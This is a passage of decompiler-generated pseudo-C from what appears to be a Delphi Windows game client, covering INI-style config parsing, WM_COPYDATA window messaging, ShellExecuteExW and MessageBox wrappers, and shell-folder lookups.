  __writefsdword(0, (unsigned int)v5);
  *(_BYTE *)(v7 + 16) = a2;
  v3 = (int)v6;
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_440E29;
  return (*(int (__fastcall **)(_DWORD, _DWORD, int))(**(_DWORD **)(v7 + 20) + 24))(
           *(_DWORD *)(v7 + 20),
           **(_DWORD **)(v7 + 20),
           v3);
}

//----- (00440E30) --------------------------------------------------------
int __usercall sub_440E30@<eax>(int a1@<eax>, Idthreadcomponent::TIdThreadComponent *a2@<edx>, int a3@<edi>)
{
  int v4; // ecx
  _WORD *v5; // eax
  signed int v6; // eax
  signed int v7; // ebx
  int v8; // edx
  int v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-60h] BYREF
  int *v12; // [esp-20h] [ebp-5Ch]
  int *v13; // [esp-1Ch] [ebp-58h]
  unsigned int v14[2]; // [esp-18h] [ebp-54h] BYREF
  int *v15; // [esp-10h] [ebp-4Ch]
  unsigned int v16[2]; // [esp-Ch] [ebp-48h] BYREF
  int *v17; // [esp-4h] [ebp-40h]
  int v18; // [esp+4h] [ebp-38h]
  int v19; // [esp+8h] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp+Ch] [ebp-30h] BYREF
  int v21; // [esp+10h] [ebp-2Ch] BYREF
  int *v22; // [esp+14h] [ebp-28h] BYREF
  int v23; // [esp+18h] [ebp-24h] BYREF
  __int32 v24; // [esp+1Ch] [ebp-20h] BYREF
  int v25; // [esp+20h] [ebp-1Ch]
  int v26; // [esp+24h] [ebp-18h]
  int System__AnsiString; // [esp+28h] [ebp-14h]
  Idthreadcomponent::TIdThreadComponent *v28; // [esp+2Ch] [ebp-10h]
  int v29; // [esp+30h] [ebp-Ch]
  __int32 v30; // [esp+34h] [ebp-8h] BYREF
  _WORD *v31; // [esp+38h] [ebp-4h] BYREF
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v28 = a2;
  v29 = a1;
  v17 = &savedregs;
  v16[1] = (unsigned int)&loc_441081;
  v16[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v16);
  (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20));
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_441052;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  sub_43EF00(v29);
  v26 = 0;
  if ( *((_DWORD *)v28 + 2) - 1 >= 0 )
  {
    v25 = *((_DWORD *)v28 + 2);
    System__AnsiString = 0;
    do
    {
      v13 = &savedregs;
      v12 = (int *)&loc_440EF5;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      sub_406C44(&v30);
      if ( *((_DWORD *)v28 + 2) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(v28, System__AnsiString);
      sub_407030(&v30, *(_DWORD *)(*((_DWORD *)v28 + 1) + 8 * System__AnsiString));
      sub_414CB4(v30, (volatile __int32 *)&v31);
      __writefsdword(0, (unsigned int)ExceptionList);
      v13 = (int *)&loc_440EFC;
      sub_406C44(&v30);
      if ( v31 )
      {
        if ( *v31 == 91 && v31[*((_DWORD *)v31 - 1) - 1] == 93 )
        {
          sub_407B20((volatile __int32 *)&v31, 1, 1);
          v5 = v31;
          if ( v31 )
            v5 = (_WORD *)*((_DWORD *)v31 - 1);
          sub_407890(&v31, (int)v5 - 1, v4);
          sub_414CB4((int)v31, &v24);
          v26 = sub_43EED0(v29, v24);
        }
        else if ( v26 )
        {
          v6 = sub_407B7C((int)&dword_44109C, (int)v31, 1);
          v7 = v6;
          if ( v6 <= 0 )
          {
            sub_429140(*(_DWORD *)(v26 + 4), (int)v31, 0, a3);
          }
          else
          {
            sub_407AD8((int)v31, 1, v6 - 1, &v21);
            sub_414CB4(v21, (volatile __int32 *)&v22);
            v13 = v22;
            v12 = &dword_44109C;
            sub_407AD8((int)v31, v7 + 1, 0x7FFFFFFF, &v19);
            sub_414CB4(v19, (volatile __int32 *)&v20);
            ExceptionList = v20;
            sub_4079F0(&v23, 3);
            v8 = *(_DWORD *)(v26 + 4);
            v18 = v23;
            sub_429140(v8, v23, 0, a3);
          }
          v9 = v26;
          *(_BYTE *)(v26 + 16) = 0;
          *(_BYTE *)(v9 + 17) = 0;
        }
      }
      ++System__AnsiString;
      --v25;
    }
    while ( v25 );
  }
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_441059;
  (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v29 + 20) + 24))(*(_DWORD *)(v29 + 20));
  __writefsdword(0, v16[0]);
  v17 = (int *)&loc_441088;
  sub_406CA4((int)&v19, 6);
  return sub_406CA4((int)&v30, 2);
}
// 440F14: conditional instruction was optimized away because %var_4.4!=0
// 440F53: variable 'v4' is possibly undefined
// 44109C: using guessed type int dword_44109C;

//----- (004410A0) --------------------------------------------------------
int __fastcall sub_4410A0(int (__fastcall ***a1)(_DWORD, int), int a2)
{
  return (**a1)(a1, a2);
}

//----- (00441110) --------------------------------------------------------
int __usercall sub_441110@<eax>(
        int a1@<eax>,
        _DWORD *cchLength@<edx>,
        Idthreadcomponent::TIdThreadComponent *a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>)
{
  int v6; // eax
  int v7; // eax
  unsigned int v9[2]; // [esp-14h] [ebp-3Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-8h] [ebp-30h] BYREF
  int *v12; // [esp-4h] [ebp-2Ch]
  int *v13; // [esp+0h] [ebp-28h]
  int v14; // [esp+4h] [ebp-24h] BYREF
  void *v15; // [esp+8h] [ebp-20h] BYREF
  int v16; // [esp+Ch] [ebp-1Ch]
  int v17; // [esp+10h] [ebp-18h]
  int System__AnsiString; // [esp+14h] [ebp-14h]
  Idthreadcomponent::TIdThreadComponent *v19; // [esp+18h] [ebp-10h]
  int v20; // [esp+1Ch] [ebp-Ch]
  void *v21; // [esp+20h] [ebp-8h] BYREF
  void *v22; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v22 = 0;
  v21 = 0;
  v19 = a3;
  v20 = a1;
  v12 = &savedregs;
  v11 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_441301;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD, Idthreadcomponent::TIdThreadComponent *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 20) + 20))(
    *(_DWORD *)(a1 + 20),
    **(_DWORD **)(a1 + 20),
    a3,
    &loc_441301,
    ExceptionList);
  v13 = &savedregs;
  v12 = (int *)&loc_4412D2;
  v11 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  System__AnsiString = sub_43EAE0(*(_DWORD *)(v20 + 4), (int)cchLength, 0);
  if ( System__AnsiString < 0 )
  {
    v17 = sub_43EED0(v20, (int)cchLength);
    *(_BYTE *)(v20 + 8) = 1;
  }
  else
  {
    cchLength = *(_DWORD **)(*(_DWORD *)(v20 + 4) + 4);
    if ( cchLength[2] <= (unsigned int)System__AnsiString )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(
        *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(v20 + 4) + 4),
        System__AnsiString);
    v17 = *(_DWORD *)(cchLength[1] + 8 * System__AnsiString + 4);
    (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v17 + 4) + 4))(*(_DWORD *)(v17 + 4));
    v6 = v17;
    *(_BYTE *)(v17 + 16) = 0;
    *(_BYTE *)(v6 + 17) = 0;
    *(_BYTE *)(v20 + 8) = 1;
  }
  if ( *((_DWORD *)v19 + 2) - 1 >= 0 )
  {
    v16 = *((_DWORD *)v19 + 2);
    System__AnsiString = 0;
    do
    {
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
      v9[1] = (unsigned int)&loc_441285;
      v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v9);
      sub_415150(System__AnsiString, (int *)&v15);
      sub_407968((volatile __int32 *)&v21, v15, &dword_44131C);
      sub_406C44(&v22);
      if ( *((_DWORD *)v19 + 2) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(v19, System__AnsiString);
      sub_407030((volatile __int32 *)&v22, *(_DWORD *)(*((_DWORD *)v19 + 1) + 8 * System__AnsiString));
      cchLength = *(_DWORD **)(v17 + 4);
      sub_407968(&v14, v21, v22);
      sub_429140((int)cchLength, v14, 0, a4);
      v7 = v17;
      *(_BYTE *)(v17 + 16) = 0;
      *(_BYTE *)(v7 + 17) = 0;
      __writefsdword(0, v9[0]);
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_44128C;
      sub_406C44(&v21);
      sub_406C44(&v22);
      *(_BYTE *)(v20 + 8) = 1;
      ++System__AnsiString;
      --v16;
    }
    while ( v16 );
  }
  if ( *(_BYTE *)(v20 + 8) && *(_BYTE *)(v20 + 9) )
    sub_440870(v20, cchLength, a4, a5);
  __writefsdword(0, (unsigned int)v11);
  (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, Idthreadcomponent::TIdThreadComponent *, int, int, int, void *, int, void *))(**(_DWORD **)(v20 + 20) + 24))(
    *(_DWORD *)(v20 + 20),
    **(_DWORD **)(v20 + 20),
    v13,
    v20,
    v19,
    System__AnsiString,
    v17,
    v16,
    v15,
    v14,
    &loc_4412D9);
  __writefsdword(0, (unsigned int)v11);
  v13 = (int *)&loc_441308;
  sub_406CA4((int)&v14, 2);
  return sub_406CA4((int)&v21, 2);
}
// 44131C: using guessed type int dword_44131C;

//----- (00441320) --------------------------------------------------------
int __userpurge sub_441320@<eax>(int a1@<eax>, int cchLength@<edx>, DWORD a3@<ecx>, int a4@<edi>, void *a5)
{
  unsigned int v5; // esi
  char v7; // zf
  int v8; // eax
  int v9; // eax
  int v10; // eax
  unsigned int v12[2]; // [esp-2Ch] [ebp-54h] BYREF
  int *v13; // [esp-24h] [ebp-4Ch]
  _DWORD v14[3]; // [esp-20h] [ebp-48h] BYREF
  _DWORD v15[2]; // [esp-14h] [ebp-3Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v17; // [esp-8h] [ebp-30h]
  int *v18; // [esp-4h] [ebp-2Ch]
  void *v19; // [esp+0h] [ebp-28h]
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp+4h] [ebp-24h] BYREF
  int v21; // [esp+8h] [ebp-20h] BYREF
  int *v22; // [esp+Ch] [ebp-1Ch]
  int v23; // [esp+10h] [ebp-18h]
  int System__AnsiString; // [esp+14h] [ebp-14h]
  int v25; // [esp+18h] [ebp-10h]
  __int32 v26; // [esp+1Ch] [ebp-Ch] BYREF
  __int32 v27; // [esp+20h] [ebp-8h] BYREF
  int v28; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v21 = 0;
  v28 = 0;
  v27 = 0;
  v26 = 0;
  v5 = a3;
  v25 = a1;
  v18 = &savedregs;
  v17 = &loc_4415BF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD, DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 20) + 20))(
    *(_DWORD *)(a1 + 20),
    **(_DWORD **)(a1 + 20),
    a3,
    v20,
    v19,
    &savedregs,
    &loc_4415BF,
    ExceptionList);
  v22 = &savedregs;
  v21 = (int)&loc_441595;
  v20 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v20);
  v19 = (void *)v5;
  v18 = &dword_4415DC;
  v17 = a5;
  sub_4079F0(&v28, 3);
  System__AnsiString = sub_43EAE0(*(_DWORD *)(v25 + 4), cchLength, 0);
  if ( System__AnsiString < 0 )
  {
    v23 = sub_43EED0(v25, cchLength);
    sub_429140(*(_DWORD *)(v23 + 4), v28, 0, a4);
    v10 = v23;
    *(_BYTE *)(v23 + 16) = 0;
    *(_BYTE *)(v10 + 17) = 0;
    *(_BYTE *)(v25 + 8) = 1;
  }
  else
  {
    cchLength = *(_DWORD *)(*(_DWORD *)(v25 + 4) + 4);
    if ( *(_DWORD *)(cchLength + 8) <= (unsigned int)System__AnsiString )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(
        *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(v25 + 4) + 4),
        System__AnsiString);
    v23 = *(_DWORD *)(*(_DWORD *)(cchLength + 4) + 8 * System__AnsiString + 4);
    System__AnsiString = sub_43EB50(v23, v5, 0);
    if ( System__AnsiString < 0 )
    {
      sub_429140(*(_DWORD *)(v23 + 4), v28, 0, a4);
      v9 = v23;
      *(_BYTE *)(v23 + 16) = 0;
      *(_BYTE *)(v9 + 17) = 0;
      *(_BYTE *)(v25 + 8) = 1;
    }
    else
    {
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
      v15[1] = &loc_4414A4;
      v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v15);
      sub_406C44(&v26);
      v14[2] = &savedregs;
      v14[1] = &loc_441478;
      v14[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v14);
      v13 = &savedregs;
      v12[1] = (unsigned int)&loc_44145B;
      v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v12);
      cchLength = *(_DWORD *)(v23 + 4);
      sub_406C44(&v26);
      if ( *(_DWORD *)(cchLength + 8) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(
          (Idthreadcomponent::TIdThreadComponent *)cchLength,
          System__AnsiString);
      sub_407030(&v26, *(_DWORD *)(*(_DWORD *)(cchLength + 4) + 8 * System__AnsiString));
      sub_407030(&v27, v26);
      __writefsdword(0, v12[0]);
      v13 = (int *)&loc_441462;
      sub_406C44(&v26);
      __writefsdword(0, (unsigned int)v17);
      v19 = &loc_44147F;
      sub_406C44(&v26);
      sub_407AA0(v27, v28);
      HIBYTE(v22) = !v7;
      __writefsdword(0, (unsigned int)v17);
      v19 = &loc_4414AB;
      sub_406C44(&v27);
      if ( HIBYTE(v22) )
      {
        cchLength = *(_DWORD *)(v23 + 4);
        v5 = System__AnsiString;
        if ( *(_BYTE *)(cchLength + 16) )
        {
          sub_40B51C((int **)off_467FF8, &v21);
          sub_428D20(v21, 0, a4);
        }
        if ( *(_DWORD *)(cchLength + 8) <= v5 )
          Idthreadcomponent::TIdThreadComponent::SetThreadName((Idthreadcomponent::TIdThreadComponent *)cchLength, v5);
        sub_406FE8((volatile __int32 *)(*(_DWORD *)(cchLength + 4) + 8 * v5), v28);
        v8 = v23;
        *(_BYTE *)(v23 + 16) = 0;
        *(_BYTE *)(v8 + 17) = 0;
        *(_BYTE *)(v25 + 8) = 1;
      }
    }
  }
  if ( *(_BYTE *)(v25 + 8) && *(_BYTE *)(v25 + 9) )
    sub_440870(v25, (const void *)cchLength, a4, v5);
  __writefsdword(0, (unsigned int)v17);
  (*(void (__fastcall **)(_DWORD, _DWORD, void *, __int32, int, int, int, int *, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *))(**(_DWORD **)(v25 + 20) + 24))(
    *(_DWORD *)(v25 + 20),
    **(_DWORD **)(v25 + 20),
    v19,
    v26,
    v25,
    System__AnsiString,
    v23,
    v22,
    v21,
    v20,
    &loc_44159C);
  __writefsdword(0, (unsigned int)v17);
  v19 = &loc_4415C6;
  sub_406C44(&v21);
  return sub_406CA4((int)&v26, 3);
}
// 44148A: variable 'v7' is possibly undefined
// 4415DC: using guessed type int dword_4415DC;

//----- (004416A0) --------------------------------------------------------
void sub_4416A0()
{
  _DWORD *v0; // [esp+0h] [ebp-8h]
  int System__AnsiString; // [esp+4h] [ebp-4h]

  if ( dword_467460 && *((_DWORD *)dword_467460 + 2) - 1 >= 0 )
  {
    System__AnsiString = *((_DWORD *)dword_467460 + 2) - 1;
    do
    {
      v0 = (_DWORD *)sub_428060(dword_467460, System__AnsiString);
      if ( sub_43DD30((int)v0, 0) )
        sub_405598(v0);
      --System__AnsiString;
    }
    while ( System__AnsiString != -1 );
  }
}

//----- (00441700) --------------------------------------------------------
_DWORD *__usercall sub_441700@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, int *a3)
{
  const void *v3; // eax
  _DWORD *result; // eax
  int v5; // [esp-4h] [ebp-Ch]

  Guitesting::TGUITestCase::Hide(a1, 1818);
  *a1 = 1;
  a1[1] = *(a3 - 2);
  a1[2] = a3[5];
  a1[3] = a3[4];
  if ( System::__linkproc__ LStrLen(a3[3]) > 0 && 2 * System::__linkproc__ LStrLen(a3[3]) < 1802 )
  {
    v5 = 2 * System::__linkproc__ LStrLen(a3[3]);
    v3 = (const void *)sub_407790(a3[3]);
    System::Move(v3, a1 + 4, v5);
  }
  *a2 = 0;
  a2[1] = 1818;
  result = a2;
  a2[2] = a1;
  return result;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);

//----- (004417B0) --------------------------------------------------------
char __userpurge sub_4417B0@<al>(
        WPARAM a1@<eax>,
        HWND a2@<edx>,
        int a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        char a6,
        int a7,
        int a8,
        int a9)
{
  int v9; // ebx
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  LRESULT v13; // eax
  unsigned int v15[6]; // [esp-Ch] [ebp-760h] BYREF
  int v16[454]; // [esp+Eh] [ebp-746h] BYREF
  _DWORD v17[3]; // [esp+728h] [ebp-2Ch] BYREF
  Classes::TThread *v18; // [esp+734h] [ebp-20h]
  DWORD LastError_1; // [esp+73Ch] [ebp-18h]
  bool v20; // [esp+743h] [ebp-11h]
  HWND hWnd; // [esp+744h] [ebp-10h]
  WPARAM wParam; // [esp+748h] [ebp-Ch]
  int v23; // [esp+74Ch] [ebp-8h]
  LPARAM lParam; // [esp+750h] [ebp-4h]
  int savedregs; // [esp+754h] [ebp+0h] BYREF

  v23 = a3;
  hWnd = a2;
  wParam = a1;
  v20 = 0;
  v9 = sub_4239A0();
  if ( v9 == sub_4239B0() )
  {
    sub_4416A0();
    if ( a6 )
    {
      sub_441700(v16, v17, &savedregs);
      lParam = (LPARAM)v17;
      v13 = SendMessageTimeoutW(hWnd, 0x4Au, wParam, (LPARAM)v17, 1u, uTimeout, 0);
      v20 = v13 != 0;
      if ( !v13 )
      {
        LastError_1 = GetLastError_1();
        sub_433830(*off_467F18, 2, LastError_1, (int)L"SendMsgToHWnd");
      }
    }
    else
    {
      if ( !dword_467460 )
        dword_467460 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TList, 1);
      LOBYTE(v12) = 1;
      v18 = sub_43DC30((Classes::TThread *)cls_GameClientCall_TMessageSendingThread, 1, v12, 2000);
      sub_441700((_DWORD *)v18 + 13, (_DWORD *)v18 + 10, &savedregs);
      *((_DWORD *)v18 + 468) = wParam;
      *((_DWORD *)v18 + 469) = hWnd;
      sub_43E1B0((int)v18, a4, a5);
      return 1;
    }
  }
  else
  {
    v15[2] = (unsigned int)&savedregs;
    v15[1] = (unsigned int)&loc_44180A;
    v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v15);
    LOBYTE(v10) = 1;
    v11 = unknown_libname_85(off_411F40, v10, L"Sending message from non main thread");
    sub_406340(v11, v9, (int)&savedregs, a4, a5);
    __writefsdword(0, v15[0]);
  }
  return v20;
}
// 4417F3: variable 'v10' is possibly undefined
// 4418D1: variable 'v12' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();
// 441638: using guessed type int (*cls_GameClientCall_TMessageSendingThread[2])();
// 441928: using guessed type wchar_t aSendingMessage[37];
// 441980: using guessed type wchar_t aSendmsgtohwnd[14];
// 467F18: using guessed type int *off_467F18;
// 4417B0: using guessed type _DWORD var_2C[3];
// 4417B0: using guessed type int var_746[454];

//----- (004419A0) --------------------------------------------------------
int __usercall sub_4419A0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax

  result = sub_43E290(a1, a2, a3);
  if ( dword_467460 )
    return sub_427F40(dword_467460, a1);
  return result;
}

//----- (004419D0) --------------------------------------------------------
_DWORD *__usercall sub_4419D0@<eax>(int a1@<edi>)
{
  __int64 v1; // rax
  _DWORD *result; // eax
  char v3; // [esp+3h] [ebp-5h]
  int v4; // [esp+4h] [ebp-4h]

  v1 = System::__linkproc__ BeforeDestruction();
  v3 = BYTE4(v1);
  v4 = v1;
  if ( dword_467460 )
    Guitesting::TGUITestCase::Hide(dword_467460, v1);
  result = sub_43DCB0(a1);
  if ( v3 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v4);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 428140: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);

//----- (00441A20) --------------------------------------------------------
_DWORD *__fastcall sub_441A20(int *a1)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v3; // [esp-8h] [ebp-14h]
  int *v4; // [esp-4h] [ebp-10h]
  const WCHAR *v5; // [esp+0h] [ebp-Ch] BYREF
  int *v6; // [esp+4h] [ebp-8h]
  LPARAM lParam; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = 0;
  v6 = a1;
  v4 = &savedregs;
  v3 = &loc_441A97;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405514(*a1, (int)&v5);
  sub_427100(v5);
  lParam = (LPARAM)(v6 + 10);
  SendMessageW((HWND)v6[469], 0x4Au, v6[468], (LPARAM)(v6 + 10));
  (*(void (__fastcall **)(int *, int))(*v6 + 4))(v6, *v6);
  __writefsdword(0, (unsigned int)v3);
  v5 = (const WCHAR *)&loc_441A9E;
  return sub_406C44(&v5);
}

//----- (00441AB0) --------------------------------------------------------
int *sub_441AB0()
{
  int *result; // eax

  if ( !++dword_46EDC4 )
    return sub_424720((int *)&dword_467460);
  return result;
}
// 46EDC4: using guessed type int dword_46EDC4;

//----- (00441AD0) --------------------------------------------------------
HINSTANCE __fastcall sub_441AD0(int a1, int a2, int a3, int a4, int a5)
{
  unsigned int v6[3]; // [esp-Ch] [ebp-58h] BYREF
  struct _SHELLEXECUTEINFOW ExecInfo; // [esp+0h] [ebp-4Ch] BYREF
  int v8; // [esp+40h] [ebp-Ch]
  int v9; // [esp+44h] [ebp-8h]
  int v10; // [esp+48h] [ebp-4h]
  int savedregs; // [esp+4Ch] [ebp+0h] BYREF

  v8 = a3;
  v9 = a2;
  v10 = a1;
  Guitesting::TGUITestCase::Hide(&ExecInfo, 60);
  ExecInfo.cbSize = 60;
  ExecInfo.fMask = 1280;
  ExecInfo.lpVerb = (LPCWSTR)sub_407790(v10);
  ExecInfo.lpFile = (LPCWSTR)sub_407790(v9);
  if ( v8 )
    ExecInfo.lpParameters = (LPCWSTR)sub_407790(v8);
  if ( a4 )
    ExecInfo.lpDirectory = (LPCWSTR)sub_407790(a4);
  ExecInfo.nShow = a5;
  ++dword_467468;
  v6[2] = (unsigned int)&savedregs;
  v6[1] = (unsigned int)&loc_441B69;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  ShellExecuteExW(&ExecInfo);
  __writefsdword(0, v6[0]);
  --dword_467468;
  return ExecInfo.hInstApp;
}
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 467468: using guessed type int dword_467468;

//----- (00441B80) --------------------------------------------------------
int __fastcall sub_441B80(HWND a1, int a2, int a3, UINT uType)
{
  const WCHAR *v4; // eax
  const WCHAR *v6; // [esp-8h] [ebp-18h]

  v6 = (const WCHAR *)sub_407790(a3);
  v4 = (const WCHAR *)sub_407790(a2);
  return MessageBoxW_0(a1, v4, v6, uType);
}

//----- (00441BC0) --------------------------------------------------------
_DWORD *__fastcall sub_441BC0(int a1, void *a2, volatile __int32 *a3)
{
  int v3; // ecx
  WCHAR *v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v7; // [esp-4h] [ebp-1Ch]
  LPVOID pv; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+8h] [ebp-10h] BYREF
  volatile __int32 *v10; // [esp+Ch] [ebp-Ch]
  void *v11; // [esp+10h] [ebp-8h]
  int csidl; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a3;
  v11 = a2;
  csidl = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_441CA9;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_406C44(a3);
  sub_406C44(&v9);
  if ( !*off_4680F8
    || (unsigned __int8)Sysutils::CompareMem(v11, off_467FD4, 16)
    || (pv = 0, ((int (__stdcall *)(void *, int, _DWORD, LPVOID *))*off_4680F8)(v11, 0x4000, 0, &pv))
    || !pv )
  {
    sub_407890(&v9, 261, v3);
    if ( csidl >= 0 )
    {
      v4 = (WCHAR *)sub_407790(v9);
      if ( !SHGetFolderPathW(0, csidl, 0, 0, v4) )
      {
        sub_424610(&v9);
        sub_406FE8(v10, v9);
      }
    }
  }
  else
  {
    unknown_libname_50(v10, pv);
    CoTaskMemFree(pv);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_441CB0;
  return sub_406C44(&v9);
}
// 441C59: variable 'v3' is possibly undefined
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 4680F8: using guessed type int *off_4680F8;

//----- (00441D80) --------------------------------------------------------
char sub_441D80()
{
  int v0; // eax

  if ( sub_425ED0(3u, 0)
    || sub_425ED0(2u, 1) && (unsigned __int8)sub_425F00()
    || (LOBYTE(v0) = sub_425ED0(2u, 0), (_BYTE)v0) && (LOBYTE(v0) = sub_425F20(), (_BYTE)v0 == 1) )
  {
    v0 = *off_467F3C;
    dword_46746C = *off_467F3C;
  }
  return v0;
}
// 46746C: using guessed type int dword_46746C;
// 467F3C: using guessed type int *off_467F3C;

//----- (00441DD0) --------------------------------------------------------
_DWORD *__fastcall sub_441DD0(int a1, int a2, int a3, volatile __int32 *a4)
{
  int v5; // esi
  int v6; // ecx
  int v7; // eax
  int v8; // edi
  unsigned __int8 *v9; // ebx
  unsigned int v11[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v12; // [esp-4h] [ebp-28h]
  int v13; // [esp+Ch] [ebp-18h]
  int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]
  int v16; // [esp+18h] [ebp-Ch]
  unsigned __int8 *v17; // [esp+1Ch] [ebp-8h]
  _WORD *v18; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v18 = 0;
  v16 = a2;
  v17 = (unsigned __int8 *)a1;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_441EB0;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = 0;
  if ( a3 )
  {
    sub_406FE8(a4, a3);
    v7 = a3;
    if ( a3 )
      v7 = *(_DWORD *)(a3 - 4);
    v5 = v7;
  }
  else
  {
    sub_406C44(a4);
  }
  v15 = v16 + 1;
  if ( v16 != -1 )
  {
    sub_407890(a4, v5 + 3 * v15 - 1, v6);
    v8 = sub_407790(*a4);
    if ( v15 - 1 >= 0 )
    {
      v13 = v15;
      v14 = 0;
      v9 = v17;
      do
      {
        sub_4154B0(*v9, 2, (int *)&v18);
        *(_WORD *)(v8 + 2 * v5) = *v18;
        *(_WORD *)(v8 + 2 * v5 + 2) = v18[1];
        if ( v15 - 1 > v14 )
          *(_WORD *)(v8 + 2 * v5 + 4) = 44;
        v5 += 3;
        ++v14;
        ++v9;
        --v13;
      }
      while ( v13 );
    }
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_441EB7;
  return sub_406C44(&v18);
}
// 441E34: variable 'v6' is possibly undefined

//----- (00441EC0) --------------------------------------------------------
volatile __int32 *__fastcall sub_441EC0(int a1, int a2, int a3)
{
  sub_441EF0(a1);
  *(_DWORD *)(a1 + 4) = a2;
  return sub_406FE8((volatile __int32 *)(a1 + 16), a3);
}

//----- (00441EF0) --------------------------------------------------------
HKEY __fastcall sub_441EF0(int a1)
{
  HKEY result; // eax

